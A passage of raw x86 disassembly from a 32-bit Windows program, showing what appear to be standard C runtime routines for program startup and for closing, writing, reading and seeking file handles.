  403d0d:	75 05                	jne    0x403d14
  403d0f:	b8 01 00 00 00       	mov    $0x1,%eax
  403d14:	c3                   	ret
  403d15:	53                   	push   %ebx
  403d16:	51                   	push   %ecx
  403d17:	bb 20 b7 40 00       	mov    $0x40b720,%ebx
  403d1c:	eb 0a                	jmp    0x403d28
  403d1e:	53                   	push   %ebx
  403d1f:	51                   	push   %ecx
  403d20:	bb 20 b7 40 00       	mov    $0x40b720,%ebx
  403d25:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403d28:	89 4b 08             	mov    %ecx,0x8(%ebx)
  403d2b:	89 43 04             	mov    %eax,0x4(%ebx)
  403d2e:	89 6b 0c             	mov    %ebp,0xc(%ebx)
  403d31:	59                   	pop    %ecx
  403d32:	5b                   	pop    %ebx
  403d33:	c2 04 00             	ret    $0x4
  403d36:	cc                   	int3
  403d37:	cc                   	int3
  403d38:	6a ff                	push   $0xffffffff
  403d3a:	50                   	push   %eax
  403d3b:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403d41:	50                   	push   %eax
  403d42:	8b 44 24 0c          	mov    0xc(%esp),%eax
  403d46:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403d4d:	89 6c 24 0c          	mov    %ebp,0xc(%esp)
  403d51:	8d 6c 24 0c          	lea    0xc(%esp),%ebp
  403d55:	50                   	push   %eax
  403d56:	c3                   	ret
  403d57:	55                   	push   %ebp
  403d58:	8b ec                	mov    %esp,%ebp
  403d5a:	6a ff                	push   $0xffffffff
  403d5c:	68 20 92 40 00       	push   $0x409220
  403d61:	68 04 62 40 00       	push   $0x406204
  403d66:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  403d6c:	50                   	push   %eax
  403d6d:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  403d74:	83 ec 58             	sub    $0x58,%esp
  403d77:	53                   	push   %ebx
  403d78:	56                   	push   %esi
  403d79:	57                   	push   %edi
  403d7a:	89 65 e8             	mov    %esp,-0x18(%ebp)
  403d7d:	ff 15 64 90 40 00    	call   *0x409064
  403d83:	33 d2                	xor    %edx,%edx
  403d85:	8a d4                	mov    %ah,%dl
  403d87:	89 15 04 c0 40 00    	mov    %edx,0x40c004
  403d8d:	8b c8                	mov    %eax,%ecx
  403d8f:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  403d95:	89 0d 00 c0 40 00    	mov    %ecx,0x40c000
  403d9b:	c1 e1 08             	shl    $0x8,%ecx
  403d9e:	03 ca                	add    %edx,%ecx
  403da0:	89 0d fc bf 40 00    	mov    %ecx,0x40bffc
  403da6:	c1 e8 10             	shr    $0x10,%eax
  403da9:	a3 f8 bf 40 00       	mov    %eax,0x40bff8
  403dae:	33 f6                	xor    %esi,%esi
  403db0:	56                   	push   %esi
  403db1:	e8 08 24 00 00       	call   0x4061be
  403db6:	59                   	pop    %ecx
  403db7:	85 c0                	test   %eax,%eax
  403db9:	75 08                	jne    0x403dc3
  403dbb:	6a 1c                	push   $0x1c
  403dbd:	e8 b0 00 00 00       	call   0x403e72
  403dc2:	59                   	pop    %ecx
  403dc3:	89 75 fc             	mov    %esi,-0x4(%ebp)
  403dc6:	e8 ec 05 00 00       	call   0x4043b7
  403dcb:	ff 15 44 90 40 00    	call   *0x409044
  403dd1:	a3 24 d5 40 00       	mov    %eax,0x40d524
  403dd6:	e8 b1 22 00 00       	call   0x40608c
  403ddb:	a3 cc bf 40 00       	mov    %eax,0x40bfcc
  403de0:	e8 5a 20 00 00       	call   0x405e3f
  403de5:	e8 9c 1f 00 00       	call   0x405d86
  403dea:	e8 b9 1c 00 00       	call   0x405aa8
  403def:	89 75 d0             	mov    %esi,-0x30(%ebp)
  403df2:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  403df5:	50                   	push   %eax
  403df6:	ff 15 60 90 40 00    	call   *0x409060
  403dfc:	e8 2d 1f 00 00       	call   0x405d2e
  403e01:	89 45 9c             	mov    %eax,-0x64(%ebp)
  403e04:	f6 45 d0 01          	testb  $0x1,-0x30(%ebp)
  403e08:	74 06                	je     0x403e10
  403e0a:	0f b7 45 d4          	movzwl -0x2c(%ebp),%eax
  403e0e:	eb 03                	jmp    0x403e13
  403e10:	6a 0a                	push   $0xa
  403e12:	58                   	pop    %eax
  403e13:	50                   	push   %eax
  403e14:	ff 75 9c             	push   -0x64(%ebp)
  403e17:	56                   	push   %esi
  403e18:	56                   	push   %esi
  403e19:	ff 15 5c 90 40 00    	call   *0x40905c
  403e1f:	50                   	push   %eax
  403e20:	e8 f0 d1 ff ff       	call   0x401015
  403e25:	89 45 a0             	mov    %eax,-0x60(%ebp)
  403e28:	50                   	push   %eax
  403e29:	e8 a7 1c 00 00       	call   0x405ad5
  403e2e:	8b 45 ec             	mov    -0x14(%ebp),%eax
  403e31:	8b 08                	mov    (%eax),%ecx
  403e33:	8b 09                	mov    (%ecx),%ecx
  403e35:	89 4d 98             	mov    %ecx,-0x68(%ebp)
  403e38:	50                   	push   %eax
  403e39:	51                   	push   %ecx
  403e3a:	e8 6b 1d 00 00       	call   0x405baa
  403e3f:	59                   	pop    %ecx
  403e40:	59                   	pop    %ecx
  403e41:	c3                   	ret
  403e42:	8b 65 e8             	mov    -0x18(%ebp),%esp
  403e45:	ff 75 98             	push   -0x68(%ebp)
  403e48:	e8 99 1c 00 00       	call   0x405ae6
  403e4d:	83 3d d4 bf 40 00 01 	cmpl   $0x1,0x40bfd4
  403e54:	75 05                	jne    0x403e5b
  403e56:	e8 81 24 00 00       	call   0x4062dc
  403e5b:	ff 74 24 04          	push   0x4(%esp)
  403e5f:	e8 b1 24 00 00       	call   0x406315
  403e64:	68 ff 00 00 00       	push   $0xff
  403e69:	ff 15 30 b7 40 00    	call   *0x40b730
  403e6f:	59                   	pop    %ecx
  403e70:	59                   	pop    %ecx
  403e71:	c3                   	ret
  403e72:	83 3d d4 bf 40 00 01 	cmpl   $0x1,0x40bfd4
  403e79:	75 05                	jne    0x403e80
  403e7b:	e8 5c 24 00 00       	call   0x4062dc
  403e80:	ff 74 24 04          	push   0x4(%esp)
  403e84:	e8 8c 24 00 00       	call   0x406315
  403e89:	59                   	pop    %ecx
  403e8a:	68 ff 00 00 00       	push   $0xff
  403e8f:	ff 15 68 90 40 00    	call   *0x409068
  403e95:	c3                   	ret
  403e96:	c7 01 30 92 40 00    	movl   $0x409230,(%ecx)
  403e9c:	8b 49 04             	mov    0x4(%ecx),%ecx
  403e9f:	85 c9                	test   %ecx,%ecx
  403ea1:	74 07                	je     0x403eaa
  403ea3:	51                   	push   %ecx
  403ea4:	e8 d0 12 00 00       	call   0x405179
  403ea9:	59                   	pop    %ecx
  403eaa:	c3                   	ret
  403eab:	56                   	push   %esi
  403eac:	8b f1                	mov    %ecx,%esi
  403eae:	e8 e3 ff ff ff       	call   0x403e96
  403eb3:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  403eb8:	74 07                	je     0x403ec1
  403eba:	56                   	push   %esi
  403ebb:	e8 99 fa ff ff       	call   0x403959
  403ec0:	59                   	pop    %ecx
  403ec1:	8b c6                	mov    %esi,%eax
  403ec3:	5e                   	pop    %esi
  403ec4:	c2 04 00             	ret    $0x4
  403ec7:	53                   	push   %ebx
  403ec8:	55                   	push   %ebp
  403ec9:	56                   	push   %esi
  403eca:	57                   	push   %edi
  403ecb:	8b 7c 24 14          	mov    0x14(%esp),%edi
  403ecf:	3b 3d 20 d5 40 00    	cmp    0x40d520,%edi
  403ed5:	0f 83 86 00 00 00    	jae    0x403f61
  403edb:	8b c7                	mov    %edi,%eax
  403edd:	8b f7                	mov    %edi,%esi
  403edf:	c1 f8 05             	sar    $0x5,%eax
  403ee2:	83 e6 1f             	and    $0x1f,%esi
  403ee5:	8d 1c 85 20 d4 40 00 	lea    0x40d420(,%eax,4),%ebx
  403eec:	c1 e6 03             	shl    $0x3,%esi
  403eef:	8b 03                	mov    (%ebx),%eax
  403ef1:	f6 44 30 04 01       	testb  $0x1,0x4(%eax,%esi,1)
  403ef6:	74 69                	je     0x403f61
  403ef8:	57                   	push   %edi
  403ef9:	e8 e3 27 00 00       	call   0x4066e1
  403efe:	83 f8 ff             	cmp    $0xffffffff,%eax
  403f01:	59                   	pop    %ecx
  403f02:	74 3c                	je     0x403f40
  403f04:	83 ff 01             	cmp    $0x1,%edi
  403f07:	74 05                	je     0x403f0e
  403f09:	83 ff 02             	cmp    $0x2,%edi
  403f0c:	75 16                	jne    0x403f24
  403f0e:	6a 02                	push   $0x2
  403f10:	e8 cc 27 00 00       	call   0x4066e1
  403f15:	6a 01                	push   $0x1
  403f17:	8b e8                	mov    %eax,%ebp
  403f19:	e8 c3 27 00 00       	call   0x4066e1
  403f1e:	59                   	pop    %ecx
  403f1f:	3b c5                	cmp    %ebp,%eax
  403f21:	59                   	pop    %ecx
  403f22:	74 1c                	je     0x403f40
  403f24:	57                   	push   %edi
  403f25:	e8 b7 27 00 00       	call   0x4066e1
  403f2a:	59                   	pop    %ecx
  403f2b:	50                   	push   %eax
  403f2c:	ff 15 70 90 40 00    	call   *0x409070
  403f32:	85 c0                	test   %eax,%eax
  403f34:	75 0a                	jne    0x403f40
  403f36:	ff 15 6c 90 40 00    	call   *0x40906c
  403f3c:	8b e8                	mov    %eax,%ebp
  403f3e:	eb 02                	jmp    0x403f42
  403f40:	33 ed                	xor    %ebp,%ebp
  403f42:	57                   	push   %edi
  403f43:	e8 1f 27 00 00       	call   0x406667
  403f48:	8b 03                	mov    (%ebx),%eax
  403f4a:	59                   	pop    %ecx
  403f4b:	80 64 30 04 00       	andb   $0x0,0x4(%eax,%esi,1)
  403f50:	85 ed                	test   %ebp,%ebp
  403f52:	74 09                	je     0x403f5d
  403f54:	55                   	push   %ebp
  403f55:	e8 9a 25 00 00       	call   0x4064f4
  403f5a:	59                   	pop    %ecx
  403f5b:	eb 15                	jmp    0x403f72
  403f5d:	33 c0                	xor    %eax,%eax
  403f5f:	eb 14                	jmp    0x403f75
  403f61:	83 25 f0 bf 40 00 00 	andl   $0x0,0x40bff0
  403f68:	c7 05 ec bf 40 00 09 	movl   $0x9,0x40bfec
  403f6f:	00 00 00 
  403f72:	83 c8 ff             	or     $0xffffffff,%eax
  403f75:	5f                   	pop    %edi
  403f76:	5e                   	pop    %esi
  403f77:	5d                   	pop    %ebp
  403f78:	5b                   	pop    %ebx
  403f79:	c3                   	ret
  403f7a:	55                   	push   %ebp
  403f7b:	8b ec                	mov    %esp,%ebp
  403f7d:	81 ec 14 04 00 00    	sub    $0x414,%esp
  403f83:	8b 4d 08             	mov    0x8(%ebp),%ecx
  403f86:	53                   	push   %ebx
  403f87:	3b 0d 20 d5 40 00    	cmp    0x40d520,%ecx
  403f8d:	56                   	push   %esi
  403f8e:	57                   	push   %edi
  403f8f:	0f 83 79 01 00 00    	jae    0x40410e
  403f95:	8b c1                	mov    %ecx,%eax
  403f97:	8b f1                	mov    %ecx,%esi
  403f99:	c1 f8 05             	sar    $0x5,%eax
  403f9c:	83 e6 1f             	and    $0x1f,%esi
  403f9f:	8d 1c 85 20 d4 40 00 	lea    0x40d420(,%eax,4),%ebx
  403fa6:	c1 e6 03             	shl    $0x3,%esi
  403fa9:	8b 03                	mov    (%ebx),%eax
  403fab:	8a 44 30 04          	mov    0x4(%eax,%esi,1),%al
  403faf:	a8 01                	test   $0x1,%al
  403fb1:	0f 84 57 01 00 00    	je     0x40410e
  403fb7:	33 ff                	xor    %edi,%edi
  403fb9:	39 7d 10             	cmp    %edi,0x10(%ebp)
  403fbc:	89 7d f8             	mov    %edi,-0x8(%ebp)
  403fbf:	89 7d f0             	mov    %edi,-0x10(%ebp)
  403fc2:	75 07                	jne    0x403fcb
  403fc4:	33 c0                	xor    %eax,%eax
  403fc6:	e9 57 01 00 00       	jmp    0x404122
  403fcb:	a8 20                	test   $0x20,%al
  403fcd:	74 0c                	je     0x403fdb
  403fcf:	6a 02                	push   $0x2
  403fd1:	57                   	push   %edi
  403fd2:	51                   	push   %ecx
  403fd3:	e8 45 03 00 00       	call   0x40431d
  403fd8:	83 c4 0c             	add    $0xc,%esp
  403fdb:	8b 03                	mov    (%ebx),%eax
  403fdd:	03 c6                	add    %esi,%eax
  403fdf:	f6 40 04 80          	testb  $0x80,0x4(%eax)
  403fe3:	0f 84 c1 00 00 00    	je     0x4040aa
  403fe9:	8b 45 0c             	mov    0xc(%ebp),%eax
  403fec:	39 7d 10             	cmp    %edi,0x10(%ebp)
  403fef:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403ff2:	89 7d 08             	mov    %edi,0x8(%ebp)
  403ff5:	0f 86 e7 00 00 00    	jbe    0x4040e2
  403ffb:	8d 85 ec fb ff ff    	lea    -0x414(%ebp),%eax
  404001:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  404004:	2b 4d 0c             	sub    0xc(%ebp),%ecx
  404007:	3b 4d 10             	cmp    0x10(%ebp),%ecx
  40400a:	73 29                	jae    0x404035
  40400c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40400f:	ff 45 fc             	incl   -0x4(%ebp)
  404012:	8a 09                	mov    (%ecx),%cl
  404014:	80 f9 0a             	cmp    $0xa,%cl
  404017:	75 07                	jne    0x404020
  404019:	ff 45 f0             	incl   -0x10(%ebp)
  40401c:	c6 00 0d             	movb   $0xd,(%eax)
  40401f:	40                   	inc    %eax
  404020:	88 08                	mov    %cl,(%eax)
  404022:	40                   	inc    %eax
  404023:	8b c8                	mov    %eax,%ecx
  404025:	8d 95 ec fb ff ff    	lea    -0x414(%ebp),%edx
  40402b:	2b ca                	sub    %edx,%ecx
  40402d:	81 f9 00 04 00 00    	cmp    $0x400,%ecx
  404033:	7c cc                	jl     0x404001
  404035:	8b f8                	mov    %eax,%edi
  404037:	8d 85 ec fb ff ff    	lea    -0x414(%ebp),%eax
  40403d:	2b f8                	sub    %eax,%edi
  40403f:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404042:	6a 00                	push   $0x0
  404044:	50                   	push   %eax
  404045:	8d 85 ec fb ff ff    	lea    -0x414(%ebp),%eax
  40404b:	57                   	push   %edi
  40404c:	50                   	push   %eax
  40404d:	8b 03                	mov    (%ebx),%eax
  40404f:	ff 34 30             	push   (%eax,%esi,1)
  404052:	ff 15 74 90 40 00    	call   *0x409074
  404058:	85 c0                	test   %eax,%eax
  40405a:	74 43                	je     0x40409f
  40405c:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40405f:	01 45 f8             	add    %eax,-0x8(%ebp)
  404062:	3b c7                	cmp    %edi,%eax
  404064:	7c 0b                	jl     0x404071
  404066:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404069:	2b 45 0c             	sub    0xc(%ebp),%eax
  40406c:	3b 45 10             	cmp    0x10(%ebp),%eax
  40406f:	72 8a                	jb     0x403ffb
  404071:	33 ff                	xor    %edi,%edi
  404073:	8b 45 f8             	mov    -0x8(%ebp),%eax
  404076:	3b c7                	cmp    %edi,%eax
  404078:	0f 85 8b 00 00 00    	jne    0x404109
  40407e:	39 7d 08             	cmp    %edi,0x8(%ebp)
  404081:	74 5f                	je     0x4040e2
  404083:	6a 05                	push   $0x5
  404085:	58                   	pop    %eax
  404086:	39 45 08             	cmp    %eax,0x8(%ebp)
  404089:	75 4c                	jne    0x4040d7
  40408b:	c7 05 ec bf 40 00 09 	movl   $0x9,0x40bfec
  404092:	00 00 00 
  404095:	a3 f0 bf 40 00       	mov    %eax,0x40bff0
  40409a:	e9 80 00 00 00       	jmp    0x40411f
  40409f:	ff 15 6c 90 40 00    	call   *0x40906c
  4040a5:	89 45 08             	mov    %eax,0x8(%ebp)
  4040a8:	eb c7                	jmp    0x404071
  4040aa:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  4040ad:	57                   	push   %edi
  4040ae:	51                   	push   %ecx
  4040af:	ff 75 10             	push   0x10(%ebp)
  4040b2:	ff 75 0c             	push   0xc(%ebp)
  4040b5:	ff 30                	push   (%eax)
  4040b7:	ff 15 74 90 40 00    	call   *0x409074
  4040bd:	85 c0                	test   %eax,%eax
  4040bf:	74 0b                	je     0x4040cc
  4040c1:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4040c4:	89 7d 08             	mov    %edi,0x8(%ebp)
  4040c7:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4040ca:	eb a7                	jmp    0x404073
  4040cc:	ff 15 6c 90 40 00    	call   *0x40906c
  4040d2:	89 45 08             	mov    %eax,0x8(%ebp)
  4040d5:	eb 9c                	jmp    0x404073
  4040d7:	ff 75 08             	push   0x8(%ebp)
  4040da:	e8 15 24 00 00       	call   0x4064f4
  4040df:	59                   	pop    %ecx
  4040e0:	eb 3d                	jmp    0x40411f
  4040e2:	8b 03                	mov    (%ebx),%eax
  4040e4:	f6 44 30 04 40       	testb  $0x40,0x4(%eax,%esi,1)
  4040e9:	74 0c                	je     0x4040f7
  4040eb:	8b 45 0c             	mov    0xc(%ebp),%eax
  4040ee:	80 38 1a             	cmpb   $0x1a,(%eax)
  4040f1:	0f 84 cd fe ff ff    	je     0x403fc4
  4040f7:	c7 05 ec bf 40 00 1c 	movl   $0x1c,0x40bfec
  4040fe:	00 00 00 
  404101:	89 3d f0 bf 40 00    	mov    %edi,0x40bff0
  404107:	eb 16                	jmp    0x40411f
  404109:	2b 45 f0             	sub    -0x10(%ebp),%eax
  40410c:	eb 14                	jmp    0x404122
  40410e:	83 25 f0 bf 40 00 00 	andl   $0x0,0x40bff0
  404115:	c7 05 ec bf 40 00 09 	movl   $0x9,0x40bfec
  40411c:	00 00 00 
  40411f:	83 c8 ff             	or     $0xffffffff,%eax
  404122:	5f                   	pop    %edi
  404123:	5e                   	pop    %esi
  404124:	5b                   	pop    %ebx
  404125:	c9                   	leave
  404126:	c3                   	ret
  404127:	55                   	push   %ebp
  404128:	8b ec                	mov    %esp,%ebp
  40412a:	83 ec 0c             	sub    $0xc,%esp
  40412d:	53                   	push   %ebx
  40412e:	56                   	push   %esi
  40412f:	8b 75 08             	mov    0x8(%ebp),%esi
  404132:	57                   	push   %edi
  404133:	3b 35 20 d5 40 00    	cmp    0x40d520,%esi
  404139:	0f 83 c5 01 00 00    	jae    0x404304
  40413f:	8b c6                	mov    %esi,%eax
  404141:	83 e6 1f             	and    $0x1f,%esi
  404144:	c1 f8 05             	sar    $0x5,%eax
  404147:	c1 e6 03             	shl    $0x3,%esi
  40414a:	8d 1c 85 20 d4 40 00 	lea    0x40d420(,%eax,4),%ebx
  404151:	8b 04 85 20 d4 40 00 	mov    0x40d420(,%eax,4),%eax
  404158:	03 c6                	add    %esi,%eax
  40415a:	8a 50 04             	mov    0x4(%eax),%dl
  40415d:	f6 c2 01             	test   $0x1,%dl
  404160:	0f 84 9e 01 00 00    	je     0x404304
  404166:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  40416a:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40416d:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  404171:	8b cf                	mov    %edi,%ecx
  404173:	74 67                	je     0x4041dc
  404175:	f6 c2 02             	test   $0x2,%dl
  404178:	75 62                	jne    0x4041dc
  40417a:	f6 c2 48             	test   $0x48,%dl
  40417d:	74 1d                	je     0x40419c
  40417f:	8a 40 05             	mov    0x5(%eax),%al
  404182:	3c 0a                	cmp    $0xa,%al
  404184:	74 16                	je     0x40419c
  404186:	ff 4d 10             	decl   0x10(%ebp)
  404189:	88 07                	mov    %al,(%edi)
  40418b:	8b 03                	mov    (%ebx),%eax
  40418d:	8d 4f 01             	lea    0x1(%edi),%ecx
  404190:	c7 45 f8 01 00 00 00 	movl   $0x1,-0x8(%ebp)
  404197:	c6 44 30 05 0a       	movb   $0xa,0x5(%eax,%esi,1)
  40419c:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40419f:	6a 00                	push   $0x0
  4041a1:	50                   	push   %eax
  4041a2:	8b 03                	mov    (%ebx),%eax
  4041a4:	ff 75 10             	push   0x10(%ebp)
  4041a7:	51                   	push   %ecx
  4041a8:	ff 34 30             	push   (%eax,%esi,1)
  4041ab:	ff 15 78 90 40 00    	call   *0x409078
  4041b1:	85 c0                	test   %eax,%eax
  4041b3:	75 3a                	jne    0x4041ef
  4041b5:	ff 15 6c 90 40 00    	call   *0x40906c
  4041bb:	6a 05                	push   $0x5
  4041bd:	59                   	pop    %ecx
  4041be:	3b c1                	cmp    %ecx,%eax
  4041c0:	75 15                	jne    0x4041d7
  4041c2:	c7 05 ec bf 40 00 09 	movl   $0x9,0x40bfec
  4041c9:	00 00 00 
  4041cc:	89 0d f0 bf 40 00    	mov    %ecx,0x40bff0
  4041d2:	e9 3e 01 00 00       	jmp    0x404315
  4041d7:	83 f8 6d             	cmp    $0x6d,%eax
  4041da:	75 07                	jne    0x4041e3
  4041dc:	33 c0                	xor    %eax,%eax
  4041de:	e9 35 01 00 00       	jmp    0x404318
  4041e3:	50                   	push   %eax
  4041e4:	e8 0b 23 00 00       	call   0x4064f4
  4041e9:	59                   	pop    %ecx
  4041ea:	e9 26 01 00 00       	jmp    0x404315
  4041ef:	8b 03                	mov    (%ebx),%eax
  4041f1:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4041f4:	01 55 f8             	add    %edx,-0x8(%ebp)
  4041f7:	8d 4c 30 04          	lea    0x4(%eax,%esi,1),%ecx
  4041fb:	8a 44 30 04          	mov    0x4(%eax,%esi,1),%al
  4041ff:	a8 80                	test   $0x80,%al
  404201:	0f 84 f8 00 00 00    	je     0x4042ff
  404207:	85 d2                	test   %edx,%edx
  404209:	74 09                	je     0x404214
  40420b:	80 3f 0a             	cmpb   $0xa,(%edi)
  40420e:	75 04                	jne    0x404214
  404210:	0c 04                	or     $0x4,%al
  404212:	eb 02                	jmp    0x404216
  404214:	24 fb                	and    $0xfb,%al
  404216:	88 01                	mov    %al,(%ecx)
  404218:	8b 45 0c             	mov    0xc(%ebp),%eax
  40421b:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40421e:	89 45 10             	mov    %eax,0x10(%ebp)
  404221:	03 c8                	add    %eax,%ecx
  404223:	3b c1                	cmp    %ecx,%eax
  404225:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  404228:	0f 83 cb 00 00 00    	jae    0x4042f9
  40422e:	8b 45 10             	mov    0x10(%ebp),%eax
  404231:	8a 00                	mov    (%eax),%al
  404233:	3c 1a                	cmp    $0x1a,%al
  404235:	0f 84 ae 00 00 00    	je     0x4042e9
  40423b:	3c 0d                	cmp    $0xd,%al
  40423d:	74 0b                	je     0x40424a
  40423f:	88 07                	mov    %al,(%edi)
  404241:	47                   	inc    %edi
  404242:	ff 45 10             	incl   0x10(%ebp)
  404245:	e9 91 00 00 00       	jmp    0x4042db
  40424a:	49                   	dec    %ecx
  40424b:	39 4d 10             	cmp    %ecx,0x10(%ebp)
  40424e:	73 18                	jae    0x404268
  404250:	8b 45 10             	mov    0x10(%ebp),%eax
  404253:	40                   	inc    %eax
  404254:	80 38 0a             	cmpb   $0xa,(%eax)
  404257:	75 06                	jne    0x40425f
  404259:	83 45 10 02          	addl   $0x2,0x10(%ebp)
  40425d:	eb 5e                	jmp    0x4042bd
  40425f:	c6 07 0d             	movb   $0xd,(%edi)
  404262:	47                   	inc    %edi
  404263:	89 45 10             	mov    %eax,0x10(%ebp)
  404266:	eb 73                	jmp    0x4042db
  404268:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40426b:	6a 00                	push   $0x0
  40426d:	50                   	push   %eax
  40426e:	ff 45 10             	incl   0x10(%ebp)
  404271:	8d 45 ff             	lea    -0x1(%ebp),%eax
  404274:	6a 01                	push   $0x1
  404276:	50                   	push   %eax
  404277:	8b 03                	mov    (%ebx),%eax
  404279:	ff 34 30             	push   (%eax,%esi,1)
  40427c:	ff 15 78 90 40 00    	call   *0x409078
  404282:	85 c0                	test   %eax,%eax
  404284:	75 0a                	jne    0x404290
  404286:	ff 15 6c 90 40 00    	call   *0x40906c
  40428c:	85 c0                	test   %eax,%eax
  40428e:	75 47                	jne    0x4042d7
  404290:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  404294:	74 41                	je     0x4042d7
  404296:	8b 03                	mov    (%ebx),%eax
  404298:	f6 44 30 04 48       	testb  $0x48,0x4(%eax,%esi,1)
  40429d:	74 13                	je     0x4042b2
  40429f:	8a 45 ff             	mov    -0x1(%ebp),%al
  4042a2:	3c 0a                	cmp    $0xa,%al
  4042a4:	74 17                	je     0x4042bd
  4042a6:	c6 07 0d             	movb   $0xd,(%edi)
  4042a9:	8b 0b                	mov    (%ebx),%ecx
  4042ab:	47                   	inc    %edi
  4042ac:	88 44 31 05          	mov    %al,0x5(%ecx,%esi,1)
  4042b0:	eb 29                	jmp    0x4042db
  4042b2:	3b 7d 0c             	cmp    0xc(%ebp),%edi
  4042b5:	75 0b                	jne    0x4042c2
  4042b7:	80 7d ff 0a          	cmpb   $0xa,-0x1(%ebp)
  4042bb:	75 05                	jne    0x4042c2
  4042bd:	c6 07 0a             	movb   $0xa,(%edi)
  4042c0:	eb 18                	jmp    0x4042da
  4042c2:	6a 01                	push   $0x1
  4042c4:	6a ff                	push   $0xffffffff
  4042c6:	ff 75 08             	push   0x8(%ebp)
  4042c9:	e8 4f 00 00 00       	call   0x40431d
  4042ce:	83 c4 0c             	add    $0xc,%esp
  4042d1:	80 7d ff 0a          	cmpb   $0xa,-0x1(%ebp)
  4042d5:	74 04                	je     0x4042db
  4042d7:	c6 07 0d             	movb   $0xd,(%edi)
  4042da:	47                   	inc    %edi
  4042db:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4042de:	39 4d 10             	cmp    %ecx,0x10(%ebp)
  4042e1:	0f 82 47 ff ff ff    	jb     0x40422e
  4042e7:	eb 10                	jmp    0x4042f9
  4042e9:	8b 03                	mov    (%ebx),%eax
  4042eb:	8d 74 30 04          	lea    0x4(%eax,%esi,1),%esi
  4042ef:	8a 06                	mov    (%esi),%al
  4042f1:	a8 40                	test   $0x40,%al
  4042f3:	75 04                	jne    0x4042f9
  4042f5:	0c 02                	or     $0x2,%al
  4042f7:	88 06                	mov    %al,(%esi)
  4042f9:	2b 7d 0c             	sub    0xc(%ebp),%edi
  4042fc:	89 7d f8             	mov    %edi,-0x8(%ebp)
  4042ff:	8b 45 f8             	mov    -0x8(%ebp),%eax
  404302:	eb 14                	jmp    0x404318
  404304:	83 25 f0 bf 40 00 00 	andl   $0x0,0x40bff0
  40430b:	c7 05 ec bf 40 00 09 	movl   $0x9,0x40bfec
  404312:	00 00 00 
  404315:	83 c8 ff             	or     $0xffffffff,%eax
  404318:	5f                   	pop    %edi
  404319:	5e                   	pop    %esi
  40431a:	5b                   	pop    %ebx
  40431b:	c9                   	leave
  40431c:	c3                   	ret
  40431d:	8b 44 24 04          	mov    0x4(%esp),%eax
  404321:	53                   	push   %ebx
  404322:	3b 05 20 d5 40 00    	cmp    0x40d520,%eax
  404328:	56                   	push   %esi
  404329:	57                   	push   %edi
  40432a:	73 73                	jae    0x40439f
  40432c:	8b c8                	mov    %eax,%ecx
  40432e:	8b f0                	mov    %eax,%esi
  404330:	c1 f9 05             	sar    $0x5,%ecx
  404333:	83 e6 1f             	and    $0x1f,%esi
  404336:	8d 3c 8d 20 d4 40 00 	lea    0x40d420(,%ecx,4),%edi
  40433d:	c1 e6 03             	shl    $0x3,%esi
  404340:	8b 0f                	mov    (%edi),%ecx
  404342:	f6 44 31 04 01       	testb  $0x1,0x4(%ecx,%esi,1)
  404347:	74 56                	je     0x40439f
  404349:	50                   	push   %eax
  40434a:	e8 92 23 00 00       	call   0x4066e1
  40434f:	83 f8 ff             	cmp    $0xffffffff,%eax
  404352:	59                   	pop    %ecx
  404353:	75 0c                	jne    0x404361
  404355:	c7 05 ec bf 40 00 09 	movl   $0x9,0x40bfec
  40435c:	00 00 00 
  40435f:	eb 4f                	jmp    0x4043b0
  404361:	ff 74 24 18          	push   0x18(%esp)
  404365:	6a 00                	push   $0x0
  404367:	ff 74 24 1c          	push   0x1c(%esp)
  40436b:	50                   	push   %eax
  40436c:	ff 15 7c 90 40 00    	call   *0x40907c
  404372:	8b d8                	mov    %eax,%ebx
  404374:	83 fb ff             	cmp    $0xffffffff,%ebx
  404377:	75 08                	jne    0x404381
  404379:	ff 15 6c 90 40 00    	call   *0x40906c
  40437f:	eb 02                	jmp    0x404383
  404381:	33 c0                	xor    %eax,%eax
  404383:	85 c0                	test   %eax,%eax
  404385:	74 09                	je     0x404390
  404387:	50                   	push   %eax
  404388:	e8 67 21 00 00       	call   0x4064f4
  40438d:	59                   	pop    %ecx
  40438e:	eb 20                	jmp    0x4043b0
  404390:	8b 07                	mov    (%edi),%eax
  404392:	80 64 30 04 fd       	andb   $0xfd,0x4(%eax,%esi,1)
  404397:	8d 44 30 04          	lea    0x4(%eax,%esi,1),%eax
  40439b:	8b c3                	mov    %ebx,%eax
  40439d:	eb 14                	jmp    0x4043b3
  40439f:	83 25 f0 bf 40 00 00 	andl   $0x0,0x40bff0
  4043a6:	c7 05 ec bf 40 00 09 	movl   $0x9,0x40bfec
  4043ad:	00 00 00 
  4043b0:	83 c8 ff             	or     $0xffffffff,%eax
  4043b3:	5f                   	pop    %edi
  4043b4:	5e                   	pop    %esi
  4043b5:	5b                   	pop    %ebx
  4043b6:	c3                   	ret
  4043b7:	83 ec 44             	sub    $0x44,%esp
  4043ba:	53                   	push   %ebx
  4043bb:	55                   	push   %ebp
  4043bc:	56                   	push   %esi
  4043bd:	57                   	push   %edi
  4043be:	68 00 01 00 00       	push   $0x100
  4043c3:	e8 3d 0d 00 00       	call   0x405105
  4043c8:	8b f0                	mov    %eax,%esi
  4043ca:	59                   	pop    %ecx
